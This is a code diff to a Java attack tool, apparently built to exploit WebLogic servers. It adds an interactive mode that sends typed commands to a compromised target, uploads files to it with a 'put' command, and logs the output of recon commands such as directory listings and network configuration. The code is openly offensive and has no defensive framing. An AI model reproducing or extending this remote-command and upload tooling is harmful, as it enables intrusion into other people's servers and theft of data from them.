@@ -1,6 +1,8 @@
 package com.mtx.tianxia.hacker;
 
+import java.io.BufferedReader;
 import java.io.File;
+import java.io.InputStreamReader;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
@@ -50,6 +52,9 @@ public class MTX_AttackWeblogic extends InfoLog
 	}
 	// 线程中删除临时文件
 	protected boolean bThreadDel = false, bThreadDelOk = false;
+	// 命令交互
+	protected boolean bInteractive = false;
+	
 	public  void doGetInfo()
 	{
 		String szFile = "data/" + szServer+"_" + port + ".txt";
@@ -60,21 +65,57 @@ public class MTX_AttackWeblogic extends InfoLog
 			fOld.renameTo(new File("data/" + szServer+"_" + port + "_"+ System.nanoTime() + ".txt"));
 //			return;
 		}
-		
-		String szMyHackFile = InfoLog.getFile(new File("/Users/xiatian/project/sfTester/data/exp.jsp"));
-		
 		String s = App.runCmd("cmd.exe /c ver");
 		String []a = null;
 		writeFile(szFile, "1、系统版本信息：\n");
 		final boolean bWin = (null != s && -1 < s.indexOf("Microsoft Windows"));
+		// 命令交互
+		if(bInteractive)
+		{
+			System.out.println("cmd:");
+			String szCmd = "";
+			BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
+			try{
+				long i = 1;
+				String s1 = "";
+				String szMyHackFile = null;
+				while(null != (szCmd = br.readLine().trim()))
+				{
+					if("exit".equalsIgnoreCase(szCmd) || "quit".equalsIgnoreCase(szCmd))break;
+					// file upload,文件上传
+					if(szCmd.startsWith("put "))
+					{
+						szCmd = szCmd.substring(4).trim();
+						String []aF = szCmd.split("\\s+");
+						szMyHackFile = InfoLog.getFile(new File(aF[0]));
+						App.putFile(szMyHackFile, aF[1]);
+						System.out.println("Ok:  " + szCmd);
+					}
+					else
+					{
+						if(bWin)szCmd = "cmd.exe /c " + szCmd;
+						s1 = App.runCmd(szCmd);
+						if(null != s && 0 < (s1 = s1.trim()).length())
+						{
+							System.out.println(s1);
+							writeFile(szFile, i+ "、" + szCmd + "：\n" + s1 + "\n");
+						}
+					}
+				}
+			}catch(Exception e){}
+			return;
+		}
+//		String szMyHackFile = InfoLog.getFile(new File("/Users/xiatian/project/sfTester/data/exp.jsp"));
+		
+		
 		if(bWin)
 		{
 			writeFile(szFile, s + "\n");
 			 a = new String[]{
-					 "jsp文件",
-					 "cmd.exe /c find . -name *.jsp",
 					 "当前目录",
 					 "cmd.exe /c echo %cd%",
+					 "当前目录下所有文件",
+					 "cmd.exe /c dir /s",
 						"网络ip配置",
 						"cmd.exe /c ipconfig  /all",
 						"arp信息",
@@ -600,6 +641,10 @@ public class MTX_AttackWeblogic extends InfoLog
 		final MTX_AttackWeblogic ma = new MTX_AttackWeblogic();
 		if(0 < args.length)
 		{
+			if(1 < args.length)
+			{
+				ma.bInteractive = "-i".equalsIgnoreCase(args[1]);
+			}
 			String []a = getIps(args[0]).split(";"), ab;
 			for(int i = 0, j = a.length; i < j; i++)
 			{
